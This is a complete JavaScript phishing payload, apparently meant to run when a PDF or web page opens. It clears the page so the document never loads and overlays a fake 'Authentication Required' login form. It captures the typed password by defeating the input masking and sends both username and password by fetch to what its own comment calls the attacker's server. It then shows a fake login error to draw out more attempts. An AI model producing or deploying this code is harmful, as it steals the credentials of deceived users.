(function() {
    // Prevent PDF from rendering
    document.documentElement.innerHTML = ""; // Clears the document to prevent PDF loading

    // Create a fake login form
    let loginBox = document.createElement("div");
    loginBox.innerHTML = `
        <div style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
                    width:300px; padding:20px; background:white; box-shadow:0px 0px 10px gray;
                    text-align:center; font-family:sans-serif;">
            <h3>Authentication Required</h3>
            <p id="error-message" style="color:red; display:none;">Incorrect username or password. Please try again.</p>
            <input type="text" id="username" placeholder="Username" style="width:90%; padding:5px; margin:5px;"><br>
            <input type="text" id="fake-password" placeholder="Password" style="width:90%; padding:5px; margin:5px;" autocomplete="off"><br>
            <button id="login-btn" style="padding:5px 20px; margin-top:10px;">Login</button>
        </div>
    `;

    document.body.appendChild(loginBox);

    let realPassword = "";

    // Handle password input (typing and backspace)
    document.getElementById("fake-password").addEventListener("keydown", function(event) {
        let inputField = event.target;

        if (event.key === "Backspace") {
            event.preventDefault(); // Prevent default backspace behavior
            if (realPassword.length > 0) {
                realPassword = realPassword.slice(0, -1); // Remove last character
                inputField.value = "•".repeat(realPassword.length); // Update display
            }
        }
    });

    document.getElementById("fake-password").addEventListener("input", function(event) {
        let inputField = event.target;
        let inputValue = inputField.value;

        // Detect new character input
        if (inputValue.length > realPassword.length) {
            let newChar = inputValue.slice(-1);
            if (newChar !== "•") {
                realPassword += newChar; // Append new character
            }
        }

        // Update input display to mask with "•"
        inputField.value = "•".repeat(realPassword.length);
    });

    // Capture the login attempt
    document.getElementById("login-btn").addEventListener("click", function() {
        let username = document.getElementById("username").value;

        console.log("[DEBUG] Captured Username:", username);
        console.log("[DEBUG] Captured Password (Masked Input Bypass):", realPassword);

        // Send credentials to attacker's server
        fetch("http://0.0.0.0:8080/auth", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(realPassword)
        }).then(response => response.text())
          .then(data => console.log("[DEBUG] Response from server:", data))
          .catch(error => console.error("[DEBUG] Error sending credentials:", error))
          .finally(() => {
              // Clear fields and show fake error message with a short delay
              setTimeout(() => {
                  realPassword = ""; // Reset stored password
                  document.getElementById("username").value = "";
                  document.getElementById("fake-password").value = "";
                  document.getElementById("error-message").style.display = "block"; // Show fake error
              }, 500); // Short delay to mimic real login validation
          });
    });
})();
